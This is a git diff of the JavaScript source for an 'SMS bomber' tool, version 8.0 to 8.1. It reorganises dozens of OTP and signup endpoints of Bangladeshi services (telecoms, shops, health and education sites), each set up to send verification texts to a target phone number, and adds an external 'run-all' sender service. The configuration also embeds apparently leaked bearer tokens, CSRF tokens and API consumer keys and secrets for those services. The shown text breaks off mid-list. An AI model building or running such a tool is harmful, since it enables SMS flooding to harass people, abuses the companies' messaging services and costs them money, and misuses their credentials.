@@ -1,6 +1,6 @@
 // ============================================================
-// ULTIMATE SMS BOMBER V8.0 - FULL PRODUCTION CODE
-// All 46+ APIs integrated (api1-api48 + V7.1 + V7.2)
+// ULTIMATE SMS BOMBER V8.1 - api/index.js
+// All 46+ APIs + GX Sends (single API style)
 // DEVELOPER: TNEH GROUP
 // ============================================================
 
@@ -26,14 +26,13 @@ const CONFIG = {
     retryDelay: 100,
     maxCountPerAPI: 500
   },
-  security: { rateLimit: { enabled: true, windowMs: 60000, maxRequests: 500 } },
-  analytics: { enabled: true, interval: 60000 }
+  security: { rateLimit: { enabled: true, windowMs: 60000, maxRequests: 500 } }
 };
 
 const DEVELOPER_INFO = {
   developer: "TNEH GROUP",
   telegram: "@tneh_owner",
-  api_version: "8.0.0-FULL",
+  api_version: "8.1.0-GX",
   build_date: new Date().toISOString()
 };
 
@@ -302,617 +301,10 @@ class BombController extends EventEmitter {
 }
 
 // ============================================================
-// PART 6: ALL APIs — V8.0 INTEGRATION
+// PART 6: ALL APIs — V8.1
 // ============================================================
 
-// ---- NEW: PHP API1-48 CONVERTED (YOUR LATEST ADDITIONS) ----
-const PHP_CONVERTED_APIS = [
-  // --- API 1: RedX User Signup ---
-  {
-    id: 500, name: "PHP-1 RedX Signup", method: "POST",
-    url: "https://api.redx.com.bd/v1/user/signup",
-    body: { name: "{phone}", service: "redx", phoneNumber: "{phone}" },
-    headers: { "Content-Type": "application/json" },
-    insecure: true
-  },
-  // --- API 2: KhaasFood (WordPress 2-step) ---
-  {
-    id: 501, name: "PHP-2 KhaasFood Step1", method: "POST",
-    url: "https://www.khaasfood.com/wp-admin/admin-ajax.php",
-    isFormData: true,
-    body: {
-      mobileNo: "+880{phone_e164}",
-      countrycode: "+880",
-      csrf: "9d9d08e6e5",
-      login: "1", json: "1",
-      action: "digits_check_mob"
-    },
-    headers: {
-      "Accept": "application/json, text/javascript, */*; q=0.01",
-      "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-      "Origin": "https://www.khaasfood.com",
-      "Referer": "https://www.khaasfood.com/",
-      "X-Requested-With": "XMLHttpRequest"
-    }
-  },
-  {
-    id: 502, name: "PHP-2 KhaasFood Step2", method: "POST",
-    url: "https://www.khaasfood.com/wp-admin/admin-ajax.php",
-    isFormData: true,
-    body: {
-      mobileNo: "+880{phone_e164}",
-      digits_reg_mail: "+880{phone_e164}",
-      dig_nounce: "9d9d08e6e5",
-      action: "digits_check_mob",
-      login: "2",
-      countrycode: "+880",
-      digregcode: "+880",
-      digregcode2: "+880",
-      digits: "1", dtype: "2", json: "1",
-      csrf: "9d9d08e6e5"
-    },
-    headers: {
-      "Accept": "*/*",
-      "Origin": "https://www.khaasfood.com",
-      "Referer": "https://www.khaasfood.com/",
-      "X-Requested-With": "XMLHttpRequest"
-    }
-  },
-  // --- API 3: Bioscope Live ---
-  {
-    id: 503, name: "PHP-3 Bioscope Live", method: "POST",
-    url: "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en",
-    body: { number: "+88{phone}" },
-    headers: {
-      "accept": "application/json",
-      "content-type": "application/json",
-      "origin": "https://www.bioscopeplus.com",
-      "referer": "https://www.bioscopeplus.com/"
-    }
-  },
-  // --- API 4: Bikroy (already in original, but keep separate copy) ---
-  {
-    id: 504, name: "PHP-4 Bikroy Login", method: "GET",
-    url: "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={phone}",
-    headers: { "application-name": "web", "referer": "https://bikroy.com/" }
-  },
-  // --- API 5: Proiojon Signup ---
-  {
-    id: 505, name: "PHP-5 Proiojon Signup", method: "POST",
-    url: "https://billing.proiojon.com/api/v1/auth/sign-up",
-    body: {
-      name: "randomName", email: "randomEmail",
-      phone: "{phone}", password: "password123", ref_code: ""
-    },
-    dynamicFields: true,
-    headers: {
-      "accept": "*/*",
-      "content-type": "application/json; charset=UTF-8",
-      "authorization": "Bearer null",
-      "origin": "https://proiojon.com",
-      "referer": "https://proiojon.com/",
-      "x-localization": "en",
-      "zoneid": "[2]"
-    }
-  },
-  // --- API 6: Beauty Booth ---
-  {
-    id: 506, name: "PHP-6 BeautyBooth", method: "POST",
-    url: "https://admin.beautybooth.com.bd/api/v2/auth/signup",
-    body: { phone: "{phone}" },
-    headers: {
-      "User-Agent": "Dart/2.19 (dart:io)",
-      "Accept": "application/json",
-      "Content-Type": "application/json; charset=utf-8"
-    }
-  },
-  // --- API 7: Medha ---
-  {
-    id: 507, name: "PHP-7 Medha OTP", method: "POST",
-    url: "https://developer.medha.info/api/send-otp",
-    body: { phone: "880{phone_10}", is_register: "1" },
-    headers: {
-      "User-Agent": "Dart/3.2 (dart:io)",
-      "Content-Type": "application/json; charset=utf-8",
-      "authorization": "Bearer"
-    }
-  },
-  // --- API 8: DeeptoPlay login (already present, keep copy) ---
-  {
-    id: 508, name: "PHP-8 DeeptoPlay Login", method: "POST",
-    url: "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en",
-    body: { number: "+88{phone}" },
-    headers: {
-      "accept": "application/json",
-      "content-type": "application/json",
-      "origin": "https://www.deeptoplay.com",
-      "referer": "https://www.deeptoplay.com/"
-    },
-    insecure: true
-  },
-  // --- API 9: Robi Web ---
-  {
-    id: 509, name: "PHP-9 Robi Web OTP", method: "POST",
-    url: "https://webapi.robi.com.bd/v1/send-otp",
-    body: { phone_number: "{phone}", type: "doorstep" },
-    headers: {
-      "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTY5MjY0MjcyOCwibmJmIjoxNjkyNjQyNzI4LCJleHAiOjE2OTI2NDYzMjgsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.5xbPa1JiodXeIST6v9c0f_4thF6tTBzaLLfuHlN7NSc",
-      "Content-Type": "application/json"
-    },
-    insecure: true
-  },
-  // --- API 10: Arogga (multipart) ---
-  {
-    id: 510, name: "PHP-10 Arogga", method: "POST",
-    url: "https://api.arogga.com/auth/v1/sms/send/?f=web&b=Chrome&v=122.0.0.0&os=Windows&osv=10",
-    isFormData: true,
-    body: { mobile: "{phone}", fcmToken: "", referral: "" },
-    headers: {
-      "accept": "*/*",
-      "content-type": "application/x-www-form-urlencoded",
-      "origin": "https://www.arogga.com",
-      "referer": "https://www.arogga.com/"
-    }
-  },
-  // --- API 11: MyGP Cinematic (send-common-otp) ---
-  {
-    id: 511, name: "PHP-11 Cinematic GP", method: "POST",
-    url: "https://api.mygp.cinematic.mobi/api/v1/send-common-otp/wap/{phone}",
-    body: {
-      headers: {
-        "Content-Type": "application/json",
-        "Access-Control-Allow-Origin": "*",
-        "Authorization": "Bearer 1pake4mh5ln64h5t26kpvm3iri"
-      }
-    },
-    headers: {
-      "accept": "application/json, text/plain, */*",
-      "content-type": "application/json;charset=UTF-8",
-      "origin": "https://cinematic.mobi",
-      "referer": "https://cinematic.mobi/"
-    }
-  },
-  // --- API 12: BDStall ---
-  {
-    id: 512, name: "PHP-12 BDStall", method: "POST",
-    url: "https://www.bdstall.com/userRegistration/save_otp_info/",
-    isFormData: true,
-    body: { UserTypeID: "2", RequestType: "1", Name: "Md", Mobile: "{phone}" }
-  },
-  // --- API 13: BCS Examaid ---
-  {
-    id: 513, name: "PHP-13 BCS Examaid", method: "POST",
-    url: "https://bcsexamaid.com/api/generateotp",
-    body: { mobile: "{phone}", softtoken: "Rifat.Admin.2022" },
-    headers: {
-      "User-Agent": "Dart/3.1 (dart:io)",
-      "Accept": "application/json",
-      "Content-Type": "application/json; charset=utf-8"
-    }
-  },
-  // --- API 14: Doctor Live BD ---
-  {
-    id: 514, name: "PHP-14 DoctorLiveBD", method: "POST",
-    url: "https://doctorlivebd.com/api/patient/auth/otpsend",
-    isFormData: true,
-    body: { country_code: "880", mobile: "{phone_10}" },
-    headers: {
-      "User-Agent": "okhttp/4.10.0",
-      "Content-Type": "application/x-www-form-urlencoded"
-    }
-  },
-  // --- API 15: Sheba XYZ (2-step) ---
-  {
-    id: 515, name: "PHP-15 Sheba GenerateToken", method: "GET",
-    url: "https://accounts.sheba.xyz/api/v1/accountkit/generate/token?app_id=8329815A6D1AE6DD",
-    dynamicToken: true
-  },
-  {
-    id: 516, name: "PHP-15 Sheba ShootOTP", method: "POST",
-    url: "https://accountkit.sheba.xyz/api/shoot-otp",
-    body: { mobile: "+88{phone}", app_id: "8329815A6D1AE6DD", api_token: "{token}" },
-    requiresToken: true,
-    headers: { "Content-Type": "application/json" }
-  },
-  // --- API 16: Apex4u ---
-  {
-    id: 517, name: "PHP-16 Apex4u", method: "POST",
-    url: "https://api.apex4u.com/api/auth/login",
-    body: { phoneNumber: "{phone}" },
-    headers: {
-      "accept": "application/json, text/plain, */*",
-      "content-type": "application/json",
-      "origin": "https://apex4u.com",
-      "referer": "https://apex4u.com/"
-    }
-  },
-  // --- API 17: Sindabad ---
-  {
-    id: 518, name: "PHP-17 Sindabad", method: "POST",
-    url: "https://offers.sindabad.com/api/mobile-otp",
-    body: { key: "c94e67fb2a59af3b6fa21f24463b2061", mobile: "+88{phone}" },
-    headers: {
-      "accept": "application/json, text/plain, */*",
-      "Content-Type": "application/json",
-      "Origin": "https://sindabad.com",
-      "Referer": "https://sindabad.com/"
-    }
-  },
-  // --- API 18: Kirei BD ---
-  {
-    id: 519, name: "PHP-18 KireiBD", method: "POST",
-    url: "https://app.kireibd.com/api/v2/send-login-otp",
-    body: { email: "{phone}" },
-    headers: {
-      "Content-Type": "application/json",
-      "x-xsrf-token": "eyJpdiI6Imh2dU9zVk9rQUR5TjlsQVBvd2F2cUE9PSIsInZhbHVlIjoiQlZUdXlHcmpES2FGUXBja1dZbUZXZG9MVksreEwxa1ZzZGgzYml3MHIxMmlraURSTjVLUnpPY0ZEeEJmSldqNGNaOG5rc0FNYkVDMlJqakJmZGVlckdvNVFobnBzTFpOSnpsbVZENlVvUW5JSHhvMkYxd1VKcG9Zc0tmTUlEdUQiLCJtYWMiOiJiZjIwNmQ0OWNlZTFiYWMyZWQ4YWRmMTEzYjAwNWFkOTNmOTgzMzRiODJlZWMxOWM0MTFhOGNkODhjNzQzZWQxIiwidGFnIjoiIn0="
-    },
-    insecure: true
-  },
-  // --- API 19: Shikho V2 ---
-  {
-    id: 520, name: "PHP-19 Shikho v2", method: "POST",
-    url: "https://api.shikho.com/auth/v2/send/sms",
-    body: { phone: "{phone}", type: "student", auth_type: "signup", vendor: "shikho" },
-    headers: {
-      "Accept": "application/json, text/plain, */*",
-      "Content-Type": "application/json",
-      "Origin": "https://app.shikho.com",
-      "Referer": "https://app.shikho.com/"
-    }
-  },
-  // --- API 20: Circle Reseller ---
-  {
-    id: 521, name: "PHP-20 Circle Reseller", method: "POST",
-    url: "https://reseller.circle.com.bd/api/v2/auth/signup",
-    body: {
-      name: "+88{phone}", email_or_phone: "+88{phone}",
-      password: "123456", password_confirmation: "123456", register_by: "phone"
-    },
-    headers: { "Content-Type": "application/json" },
-    insecure: true
-  },
-  // --- API 21: BDTickets Auth ---
-  {
-    id: 522, name: "PHP-21 BDTickets Auth", method: "POST",
-    url: "https://api.bdtickets.com:20100/v1/auth",
-    body: { createUserCheck: true, phoneNumber: "+88{phone}", applicationChannel: "WEB_APP" },
-    headers: {
-      "accept": "application/json, text/plain, */*",
-      "content-type": "application/json",
-      "origin": "https://bdtickets.com",
-      "referer": "https://bdtickets.com/"
-    }
-  },
-  // --- API 22: GP BK Shop FWA ---
-  {
-    id: 523, name: "PHP-22 GP FWA OTP", method: "POST",
-    url: "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp",
-    body: { phone: "{phone}", email: "", language: "en" },
-    headers: { "Content-Type": "application/json" }
-  },
-  // --- API 23: RFL BestBuy ---
-  {
-    id: 524, name: "PHP-23 RFL BestBuy", method: "POST",
-    url: "https://rflbestbuy.com/api/login/?lang_code=en&currency_code=BDT",
-    body: {
-      company_id: "26", password2: "Riyaz@123", currency_code: "BDT",
-      user_type: "C", email: "{phone}@gmail.com", g_id: "", lang_code: "en",
-      operating_system: "Android", otp_verify: false, password1: "Riyaz@123",
-      phone: "{phone}", storefront_id: "3"
-    },
-    headers: {
-      "Authorization": "Bearer bWlzNTdAcHJhbmdyb3VwLmNvbTpJWE94N1NVUFYwYUE0Rjg4Nmg4bno5V2I2STUzNTNBQQ==",
-      "Content-Type": "application/json"
-    }
-  },
-  // --- API 24: Chorki Mobile ---
-  {
-    id: 525, name: "PHP-24 Chorki Mobile", method: "POST",
-    url: "https://api-dynamic.chorki.com/v1/auth/login?country=BD&platform=mobile",
-    body: { number: "{phone}" },
-    headers: {
-      "User-Agent": "Chorki/2.0.33 (Android 13; GM1917; GM1917; arm64-v8a)",
-      "Content-Type": "application/json"
-    }
-  },
-  // --- API 25: HishabExpress ---
-  {
-    id: 526, name: "PHP-25 HishabExpress", method: "POST",
-    url: "https://api.hishabexpress.com/login/status",
-    isFormData: true,
-    body: { msisdn: "{phone}", hash: "Hello" },
-    headers: { "User-Agent": "Dart/2.19 (dart:io)", "Content-Type": "application/x-www-form-urlencoded" },
-    insecure: true
-  },
-  // --- API 26: Mujib Chorcha ---
-  {
-    id: 527, name: "PHP-26 Chorcha", method: "GET",
-    url: "https://mujib.chorcha.net/auth/check?phone={phone}",
-    headers: { "x-chorcha-mode": "prod", "x-chorcha-platform": "web" }
-  },
-  // --- API 27: Wafilife ---
-  {
-    id: 528, name: "PHP-27 Wafilife", method: "GET",
-    url: "https://m-backend.wafilife.com/wp-json/wc/v2/send-otp?p={phone}&consumer_key=ck_e8c5b4a69729dd913dce8be03d7878531f6511ff&consumer_secret=cs_f866e5c6543065daa272504c2eea71044579cff3"
-  },
-  // --- API 28: Robi Register OTP ---
-  {
-    id: 529, name: "PHP-28 Robi Register", method: "POST",
-    url: "https://webapi.robi.com.bd/v1/account/register/otp",
-    body: { phone_number: "{phone}" },
-    headers: {
-      "X-CSRF-TOKEN": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTY4MTQ3MjU5NiwibmJmIjoxNjgxNDcyNTk2LCJleHAiOjE2ODE0NzYxOTYsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.-k1ByaD69rmEy1NXzEIT08fJvZ9c6OysjmaQfe8hEz0",
-      "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTY4MTQ3MjU5NiwibmJmIjoxNjgxNDcyNTk2LCJleHAiOjE2ODE0NzYxOTYsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.-k1ByaD69rmEy1NXzEIT08fJvZ9c6OysjmaQfe8hEz0",
-      "Content-Type": "application/json"
-    },
-    insecure: true
-  },
-  // --- API 29: Chardike ---
-  {
-    id: 530, name: "PHP-29 Chardike", method: "POST",
-    url: "https://api.chardike.com/api/otp/send",
-    body: { phone: "{phone}", otp_type: "login" },
-    headers: {
-      "accept": "*/*",
-      "content-type": "application/json",
-      "origin": "https://chardike.com",
-      "referer": "https://chardike.com/"
-    }
-  },
-  // --- API 30: eTestPaper (2-step) ---
-  {
-    id: 531, name: "PHP-30 eTestPaper Exists", method: "POST",
-    url: "https://prod.etestpaper.net/api/exists",
-    body: { phone: "{phone}" },
-    headers: {
-      "content-type": "application/json",
-      "origin": "https://www.etestpaper.net",
-      "referer": "https://www.etestpaper.net/"
-    }
-  },
-  {
-    id: 532, name: "PHP-30 eTestPaper OTP", method: "POST",
-    url: "https://prod.etestpaper.net/api/v4/auth/otp",
-    body: { phone: "{phone}", recaptcha: "668be73dcad2999a957ff440" },
-    headers: {
-      "content-type": "application/json",
-      "origin": "https://www.etestpaper.net",
-      "referer": "https://www.etestpaper.net/"
-    }
-  },
-  // --- API 31: GPay GP Checksignup ---
-  {
-    id: 533, name: "PHP-31 GPay CheckSignup", method: "POST",
-    url: "https://gpayapp.grameenphone.com/prod_mfs/sub/user/checksignup",
-    body: { deviceId: "35{phone}30", msisdn: "{phone}", tran_type: "OTPREQSIGNUP" },
-    headers: { "Content-Type": "application/json" }
-  },
-  // --- API 32: AppLink OTP ---
-  {
-    id: 534, name: "PHP-32 AppLink OTP", method: "POST",
-    url: "https://apps.applink.com.bd/appstore-v4-server/login/otp/request",
-    body: { msisdn: "88{phone}" },
-    headers: {
-      "content-type": "application/json",
-      "origin": "https://applink.com.bd",
-      "referer": "https://applink.com.bd/"
-    },
-    insecure: true
-  },
-  // --- API 33: Priyo Shikkhaloy ---
-  {
-    id: 535, name: "PHP-33 Priyo Shikkhaloy", method: "POST",
-    url: "https://app.priyoshikkhaloy.com/api/user/register-login.php",
-    isFormData: true,
-    body: { mobile: "{phone}" },
-    headers: { "User-Agent": "okhttp/4.11.0", "Content-Type": "application/x-www-form-urlencoded" },
-    insecure: true
-  },
-  // --- API 34: Kabbik ---
-  {
-    id: 536, name: "PHP-34 Kabbik OTP", method: "POST",
-    url: "https://api.kabbik.com/v1/auth/otpnew",
-    body: { msisdn: "88{phone}", currentTimeLong: "currentTime", passKey: "qOQNBtVmoTTPVmfn" },
-    dynamicFields: true,
-    headers: {
-      "content-type": "application/json",
-      "authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMjgyMCIsInJvbGUiOjEsImlhdCI6MTY2NTc0NjIyNX0.dSY47sipaGTI_OtsysFWw_kaKZKWHWRtp4vklstVgVc",
-      "origin": "https://kabbik.com",
-      "referer": "https://kabbik.com/"
-    },
-    insecure: true
-  },
-  // --- API 35: Salextra ---
-  {
-    id: 537, name: "PHP-35 Salextra", method: "POST",
-    url: "https://salextra.com.bd/customer/checkusernameavailabilityonregistration",
-    isFormData: true,
-    body: {
-      username: "{phone}",
-      loginType: "MOBILE",
-      __RequestVerificationToken: "CfDJ8LiTcoRywYZJiSdmMqGF8TUqJw9C6KMdGm1h66OVTdHacNf0PM5Ejsmu_DNPddqz7Sk-XUyXwxIyHALKpZ5bn1jwr9l-9IzOmASY_Z3cKb2mndEZn3KyLqq80U8QyitKCPtmt1zxxiMWd_970_jfTmg"
-    },
-    headers: {
-      "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
-      "origin": "https://salextra.com.bd",
-      "referer": "https://salextra.com.bd/register?returnUrl=%2F",
-      "x-requested-with": "XMLHttpRequest"
-    }
-  },
-  // --- API 36: Sundora Customer ---
-  {
-    id: 538, name: "PHP-36 Sundora Customer", method: "POST",
-    url: "https://api.sundora.com.bd/api/user/customer/",
-    body: {
-      customer: {
-        email: "kgjkgjgg{phone}@gmail.com",
-        password: "#bUV?'3*N#7N}.g",
-        password_confirmation: "#bUV?'3*N#7N}.g",
-        phone: "+880{phone_10}",
-        draft_order_id: null,
-        first_name: "sdfgfd", last_name: "fgfd",
-        note: { birthday: "", gender: "male" },
-        withTimeout: true, newsletter_email: true, newsletter_sms: true
-      }
-    },
-    headers: {
-      "content-type": "application/json",
-      "My-Location": "BD",
-      "origin": "https://sundora.com.bd",
-      "referer": "https://sundora.com.bd/"
-    }
-  },
-  // --- API 37: Cinematic SBENT ---
-  {
-    id: 539, name: "PHP-37 Cinematic SBENT", method: "POST",
-    url: "https://api.mygp.cinematic.mobi/api/v1/otp/88{phone}/SBENT_3GB7D",
-    body: {
-      accessinfo: {
-        access_token: "K165S6V6q4C6G7H0y9C4f5W7t5YeC6",
-        referenceCode: "20190827042622"
-      }
-    },
-    headers: { "Content-Type": "application/json" },
-    insecure: true
-  },
-  // --- API 38: BajiStar ---
-  {
-    id: 540, name: "PHP-38 BajiStar OTP", method: "GET",
-    url: "https://bajistar.com:1443/public/api/v1/getOtp?recipient=88{phone}",
-    headers: {
-      "Origin": "https://www.playbajistar.com",
-      "Referer": "https://www.playbajistar.com/"
-    }
-  },
-  // --- API 39: DocTime ---
-  {
-    id: 541, name: "PHP-39 DocTime", method: "POST",
-    url: "https://api.doctime.com.bd/api/authenticate",
-    body: { contact_no: "{phone}", country_calling_code: "88" },
-    headers: {
-      "User-Agent": "okhttp/4.12.0",
-      "Content-Type": "application/json",
-      "app-version": "0.29.11",
-      "device-brand": "Genymobile",
-      "platform": "Android",
-      "device-model": "Galaxy S4",
-      "os-version": "11",
-      "locale": "bn"
-    },
-    insecure: true
-  },
-  // --- API 40: Weblogin DA GP ---
-  {
-    id: 542, name: "PHP-40 WebloginDA GP", method: "POST",
-    url: "https://webloginda.grameenphone.com/backend/api/v1/otp",
-    isFormData: true,
-    body: { msisdn: "{phone}" },
-    headers: {
-      "Content-Type": "application/x-www-form-urlencoded",
-      "Origin": "https://gpfi.grameenphone.com",
-      "Referer": "https://gpfi.grameenphone.com/"
-    }
-  },
-  // --- API 41: Meenabazar ---
-  {
-    id: 543, name: "PHP-41 Meenabazar OTP", method: "POST",
-    url: "https://meenabazardev.com/api/mobile/front/send/otp?CellPhone={phone}&type=login",
-    headers: {
-      "User-Agent": "Dart/3.2 (dart:io)",
-      "content-type": "application/json"
-    }
-  },
-  // --- API 42: MedEasy ---
-  {
-    id: 544, name: "PHP-42 MedEasy OTP", method: "GET",
-    url: "https://api.medeasy.health/api/send-otp/+88{phone}/",
-    headers: {
-      "accept": "application/json",
-      "origin": "https://medeasy.health",
-      "referer": "https://medeasy.health/"
-    }
-  },
-  // --- API 43: Iqra Live ---
-  {
-    id: 545, name: "PHP-43 Iqra Live", method: "GET",
-    url: "http://apibeta.iqra-live.com/api/v1/sent-otp/{phone}",
-    insecure: true
-  },
-  // --- API 44: Chokrojan ---
-  {
-    id: 546, name: "PHP-44 Chokrojan Passenger", method: "POST",
-    url: "https://chokrojan.com/api/v1/passenger/login/mobile",
-    body: {
-      mobile_number: "{phone}",
-      otp_token: "826cb796fd3f163c420c8da1238aa9d1c4da36d4f5729d711a9cacaca47df5a7"
-    },
-    headers: {
-      "Authorization": "Bearer null",
-      "Content-Type": "application/json;charset=UTF-8",
-      "Origin": "https://chokrojan.com",
-      "Referer": "https://chokrojan.com/login",
-      "company-id": "1",
-      "domain-name": "chokrojan.com",
-      "user-platform": "3"
-    },
-    insecure: true
-  },
-  // --- API 45: Shomvob ---
-  {
-    id: 547, name: "PHP-45 Shomvob OTP", method: "POST",
-    url: "https://backend-api.shomvob.co/api/v2/otp/phone?is_retry=0",
-    body: { phone: "88{phone}" },
-    headers: {
-      "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlNob212b2JUZWNoQVBJVXNlciIsImlhdCI6MTY2MzMzMDkzMn0.4Wa_u0ZL_6I37dYpwVfiJUkjM97V3_INKVzGYlZds1s",
-      "Content-Type": "application/json; charset=utf-8"
-    }
-  },
-  // --- API 46: RedX Signup v2 ---
-  {
-    id: 548, name: "PHP-46 RedX v2", method: "POST",
-    url: "https://api.redx.com.bd/v1/user/signup",
-    body: { name: "Alamin Sheikh", phoneNumber: "{phone}", service: "redx" },
-    headers: { "Content-Type": "application/json" },
-    insecure: true
-  },
-  // --- API 47: Cinematic GP Common OTP ---
-  {
-    id: 549, name: "PHP-47 Cinematic Common", method: "POST",
-    url: "https://api.mygp.cinematic.mobi/api/v1/send-common-otp/88{phone}/",
-    headers: { "Content-Type": "application/json" },
-    insecure: true
-  },
-  // --- API 48: MyBDJobs Orchestrator ---
-  {
-    id: 550, name: "PHP-48 MyBDJobs", method: "POST",
-    url: "https://mybdjobsorchestrator-odcx6humqq-as.a.run.app/api/CreateAccountOrchestrator/CreateAccount",
-    body: {
-      firstName: "randomName", lastName: "", gender: "M",
-      email: "randomEmail", userName: "{phone}",
-      password: "Kamrul12345@", confirmPassword: "Kamrul12345@",
-      status: 0, mobile: "{phone}", workAreaCategory: 2,
-      createdFrom: 0, createdAt: "now", decodeId: "",
-      catTypeId: 1, userNameType: "mobile", disabilityId: "",
-      deviceTypeId: 0, countryCode: "88", socialMediaId: "",
-      socialMediaName: "", socialMediaTimestamp: "now",
-      ttcId: "", gradeId: "", knownBy: "", isTtc: false,
-      trainingCenterName: "", trainingDistrict: "",
-      queryString: "", campaignId: 0, campaignSource: "",
-      campaignReferer: "", isFromSocialMedia: false,
-      isActive: 0, useType: "", uNtype: 0
-    },
-    dynamicFields: true,
-    headers: {
-      "accept": "application/json, text/plain, */*",
-      "content-type": "application/json",
-      "origin": "https://mybdjobs.bdjobs.com",
-      "referer": "https://mybdjobs.bdjobs.com/"
-    }
-  }
-];
-
-// ---- V7.1 NEW APIS ----
+// ---- V7.1 NEW APIS + GX SENDS ----
 const NEW_APIS_V71 = [
   { id: 351, name: "Walton Plaza", method: "POST", url: "https://waltonplaza.com.bd/api/auth/otp/create",
     body: { auth: { countryCode: "880", deviceUuid: "197bef80-ec8a-11f0-8299-fdfde03856d4", phone: "{phone}", type: "LOGIN" }, captchaToken: "no recapcha" } },
@@ -922,7 +314,214 @@ const NEW_APIS_V71 = [
     body: { _token: "tX7eVhj93u8lLSTWVBDwIBN4jvruZNqc7VVAmf1v", phone: "{phone}" } },
   { id: 354, name: "SmartDeal BD", method: "POST", url: "https://smartdeal.com.bd/register", isFormData: true,
     body: { _token: "gkjdzpI26XOPh062eg0gDxZSxX34XpOkiuHmjisZ", name: "nox", phone: "{phone}", country_code: "88", email: "", password: "unlock2022", password_confirmation: "unlock2022", checkbox_example_1: "on" } },
-  { id: 355, name: "GX Sends Run-All", method: "GET", url: "https://gxsends.onrender.com/run-all?phone={phone}", isGXSends: true }
+  // ⭐ GX SENDS — added as a normal API
+  { id: 355, name: "GX Sends", method: "GET", url: "https://gxsends.onrender.com/run-all?phone={phone}", timeout: 30000 }
+];
+
+// ---- PHP CONVERTED (api1-api48) ----
+const PHP_CONVERTED_APIS = [
+  { id: 500, name: "PHP-1 RedX Signup", method: "POST", url: "https://api.redx.com.bd/v1/user/signup",
+    body: { name: "{phone}", service: "redx", phoneNumber: "{phone}" },
+    headers: { "Content-Type": "application/json" }, insecure: true },
+
+  { id: 501, name: "PHP-2 KhaasFood Step1", method: "POST", url: "https://www.khaasfood.com/wp-admin/admin-ajax.php",
+    isFormData: true,
+    body: { mobileNo: "+880{phone_e164}", countrycode: "+880", csrf: "9d9d08e6e5", login: "1", json: "1", action: "digits_check_mob" },
+    headers: { "Accept": "application/json, text/javascript, */*; q=0.01", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://www.khaasfood.com", "Referer": "https://www.khaasfood.com/", "X-Requested-With": "XMLHttpRequest" } },
+
+  { id: 502, name: "PHP-2 KhaasFood Step2", method: "POST", url: "https://www.khaasfood.com/wp-admin/admin-ajax.php",
+    isFormData: true,
+    body: { mobileNo: "+880{phone_e164}", digits_reg_mail: "+880{phone_e164}", dig_nounce: "9d9d08e6e5", action: "digits_check_mob", login: "2", countrycode: "+880", digregcode: "+880", digregcode2: "+880", digits: "1", dtype: "2", json: "1", csrf: "9d9d08e6e5" },
+    headers: { "Accept": "*/*", "Origin": "https://www.khaasfood.com", "Referer": "https://www.khaasfood.com/", "X-Requested-With": "XMLHttpRequest" } },
+
+  { id: 503, name: "PHP-3 Bioscope Live", method: "POST", url: "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en",
+    body: { number: "+88{phone}" },
+    headers: { "accept": "application/json", "content-type": "application/json", "origin": "https://www.bioscopeplus.com", "referer": "https://www.bioscopeplus.com/" } },
+
+  { id: 504, name: "PHP-4 Bikroy Login", method: "GET", url: "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={phone}",
+    headers: { "application-name": "web", "referer": "https://bikroy.com/" } },
+
+  { id: 505, name: "PHP-5 Proiojon Signup", method: "POST", url: "https://billing.proiojon.com/api/v1/auth/sign-up",
+    body: { name: "randomName", email: "randomEmail", phone: "{phone}", password: "password123", ref_code: "" },
+    dynamicFields: true,
+    headers: { "accept": "*/*", "content-type": "application/json; charset=UTF-8", "authorization": "Bearer null", "origin": "https://proiojon.com", "referer": "https://proiojon.com/", "x-localization": "en", "zoneid": "[2]" } },
+
+  { id: 506, name: "PHP-6 BeautyBooth", method: "POST", url: "https://admin.beautybooth.com.bd/api/v2/auth/signup",
+    body: { phone: "{phone}" },
+    headers: { "User-Agent": "Dart/2.19 (dart:io)", "Accept": "application/json", "Content-Type": "application/json; charset=utf-8" } },
+
+  { id: 507, name: "PHP-7 Medha OTP", method: "POST", url: "https://developer.medha.info/api/send-otp",
+    body: { phone: "880{phone_10}", is_register: "1" },
+    headers: { "User-Agent": "Dart/3.2 (dart:io)", "Content-Type": "application/json; charset=utf-8", "authorization": "Bearer" } },
+
+  { id: 508, name: "PHP-8 DeeptoPlay Login", method: "POST", url: "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en",
+    body: { number: "+88{phone}" },
+    headers: { "accept": "application/json", "content-type": "application/json", "origin": "https://www.deeptoplay.com", "referer": "https://www.deeptoplay.com/" }, insecure: true },
+
+  { id: 509, name: "PHP-9 Robi Web OTP", method: "POST", url: "https://webapi.robi.com.bd/v1/send-otp",
+    body: { phone_number: "{phone}", type: "doorstep" },
